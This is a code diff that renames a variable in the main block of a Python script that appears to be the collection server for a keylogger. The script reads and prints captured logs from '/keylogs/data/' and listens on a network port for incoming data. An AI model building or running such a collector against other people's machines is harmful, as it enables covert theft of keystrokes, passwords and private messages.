@@ -82,9 +82,9 @@ def receiver(port):
 
 if __name__ == '__main__':
 
-    argument = argument()
+    arg = argument()
 
-    if argument.readfile:
+    if arg.readfile:
         path = '/keylogs/data/'
         fics = glob.glob(os.path.join(path, '*'))
         for fic in fics:
@@ -97,7 +97,7 @@ if __name__ == '__main__':
                 print("------------------")
         sys.exit()
 
-    if argument.show and not argument.readfile:
+    if arg.show and not arg.readfile:
         path = '/keylogs/data/'
         fics = glob.glob(os.path.join(path, '*'))
         for fic in fics:
@@ -108,9 +108,9 @@ if __name__ == '__main__':
 
     else:
 
-        if argument.listen:
-            print(f'Argument -l: {argument.listen}')
-            port = argument.listen
+        if arg.listen:
+            print(f'Argument -l: {arg.listen}')
+            port = arg.listen
         else:
             port = PORT
 
